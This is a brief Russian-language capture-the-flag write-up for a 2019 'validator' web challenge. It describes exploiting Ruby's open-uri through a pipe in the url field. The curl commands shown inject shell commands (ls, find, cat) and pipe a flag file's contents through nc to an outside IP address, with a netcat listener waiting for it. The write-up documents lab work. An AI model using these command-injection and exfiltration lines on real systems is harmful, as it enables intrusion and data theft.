1. Указываем в качестве ссылки ip:port нашего сервера с nc. Видим GET запрос с юзер-агентом руби. 20-30 минут на безуспешную попытку поиграть с кодами ответов
и содержимым ни к чему не приводят.
2. Дальше гугл -> ruby open url -> open-uri vulnerability -> первая же ссылка на хабр..

3. Проверяем
```bash
curl 'http://validator.ctf2019.rocks/validate/' --data 'url=| ls'
```
4. Пробуем вывод в nc
```bash
nc -lvp 4444
curl 'http://validator.ctf2019.rocks/validate/' --data 'url=| find / -iname "flag" | nc 89.163.129.121 4444'
curl 'http://validator.ctf2019.rocks/validate/' --data 'url=| cat /opt/validator/flag | nc 89.163.129.121 4444'
```
5. Допы в /opt/validator/app.rb